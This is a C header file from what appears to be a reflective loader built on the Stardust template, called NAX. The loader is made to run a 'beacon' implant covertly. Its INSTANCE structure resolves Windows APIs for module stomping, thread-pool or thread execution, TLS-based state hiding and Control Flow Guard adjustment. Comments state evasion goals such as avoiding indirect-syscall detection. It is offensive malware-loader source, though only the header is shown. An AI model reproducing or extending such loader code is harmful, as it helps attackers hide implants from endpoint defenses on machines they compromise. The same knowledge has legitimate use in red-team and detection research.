#ifndef STARDUST_COMMON_H
#define STARDUST_COMMON_H

//
// system headers
//
#include <windows.h>

//
// stardust headers
//
#include <Native.h>
#include <Macros.h>
#include <Ldr.h>
#include <Defs.h>
#include <Utils.h>

//
// NAX UDRL instance pointer - stored in TLS via consecutive-slot egghunter
// (no .global section, no NtProtectVirtualMemory on own pages).
//

typedef struct _INSTANCE {

    //
    // Base address (StRipStart) and total size of the loader blob.
    // beacon_src = Base.Buffer + Base.Length
    //
    BUFFER Base;

    struct {

        //
        // ntdll.dll - resolved in PreMain (PEB already has ntdll loaded)
        //
        D_API( RtlAllocateHeap         )  /* heap alloc for INSTANCE itself    */
        D_API( NtProtectVirtualMemory  )  /* preserved for future direct-syscall use */
        D_API( VirtualProtect           )  /* Win32 wrapper - avoids indirect syscall detection */

        //
        // kernel32.dll - resolved in PreMain for TLS globals
        //
        D_API( TlsAlloc    )
        D_API( TlsSetValue )
        D_API( TlsFree     )

#if NAX_STOMP_MODE == NAX_STOMP_VIRTUAL
        D_API( NtAllocateVirtualMemory )  /* exec buffer alloc (VirtualAlloc)  */
#endif

#if NAX_EXEC_MODE == NAX_EXEC_THREADPOOL
        D_API( TpAllocWork   )            /* schedule beacon on thread pool    */
        D_API( TpPostWork    )            /* submit work item to pool          */
        D_API( TpReleaseWork )            /* release work object after exec    */
#endif

        //
        // kernel32.dll - resolved in Main via PEB walk
        //
#if NAX_STOMP_MODE == NAX_STOMP_MODULE
        D_API( LoadLibraryExW )           /* load sacrificial DLL for stomping */
#endif

#if NAX_EXEC_MODE == NAX_EXEC_THREAD
        D_API( CreateThread   )           /* spawn beacon on clean stack       */
#endif

#if NAX_STOMP_MODE == NAX_STOMP_MODULE
        D_API( GetProcessMitigationPolicy )
        BOOL ( __stdcall *SetProcessValidCallTargets )( HANDLE, PVOID, SIZE_T, ULONG, PVOID );
#endif

    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
        PVOID Kernelbase;
    } Modules;

#if NAX_STOMP_MODE == NAX_STOMP_MODULE
    PVOID StompDllBase;
#endif

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

VOID Main(
    _In_ PVOID Param
);

#endif //STARDUST_COMMON_H
